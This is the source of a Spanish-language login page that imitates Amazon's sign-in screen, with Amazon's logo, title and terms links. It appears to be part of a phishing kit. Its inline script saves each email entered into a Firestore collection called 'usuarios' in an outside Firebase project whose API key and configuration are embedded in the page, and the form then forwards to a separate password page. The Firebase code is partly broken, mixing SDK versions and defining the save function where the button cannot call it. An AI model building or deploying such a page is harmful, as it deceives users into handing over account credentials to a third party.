<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <link rel="icon" href="images/Amazon.ico" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    
    <div class="logo-container">
        <img src="images/amazon2.png" alt="Logo Amazon">
    </div>
    <div class="login-container">
        <form action="password.html" method="GET">
            <h2>Iniciar sesión</h2>
            <div class="input-group">
                <label for="email">Dirección de email o número de teléfono móvil</label>
                <input type="text" id="email" name="email" required>
            </div>
            <button type="submit" onclick="guardar(event)">Continuar</button>
            <div class="info-text">
                Al continuar, aceptas las 
                <a href="cond_uso.html">Condiciones de uso</a> y el 
                <a href="privacidad.html">Aviso de privacidad</a> de Amazon.
            </div>
            <div class="help">
                <a href="#">¿Necesitas ayuda?</a>
            </div>
        </form>
        
        <footer>
            <div class="new-account">
                <label class="info-text">¿Eres nuevo en Amazon?</label>
                <a href="#" class="create-account">Crear tu cuenta en Amazon</a>
            </div>
        </footer>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-firestore.js"></script>
    <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "firebase/app";
        import { getAnalytics } from "firebase/analytics";
 
        const firebaseConfig = {
        apiKey: "AIzaSyDg8MakUCFHb7jM5iUZT1AlmjeJnDzL-OA",
        authDomain: "fir-89c9f.firebaseapp.com",
        projectId: "fir-89c9f",
        storageBucket: "fir-89c9f.appspot.com",
        messagingSenderId: "329196471488",
        appId: "1:329196471488:web:d18dc0d24ae42b6afb9925",
        measurementId: "G-6RNNHNRYGT"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        // Initialize Cloud Firestore and get a reference to the service
        var db = firebase.firestore();
    </script>
    <script type="module">
        import { collection, addDoc } from "firebase/firestore"; 

        function guardar(){
            try {
            const docRef = addDoc(collection(db, "usuarios"), {
                email: document.getElementById('email').value,
            });
            console.log("Document written with ID: ", docRef.id);
            } catch (e) {
            console.error("Error adding document: ", e);
            }
        }
    </script>
</body>
</html>
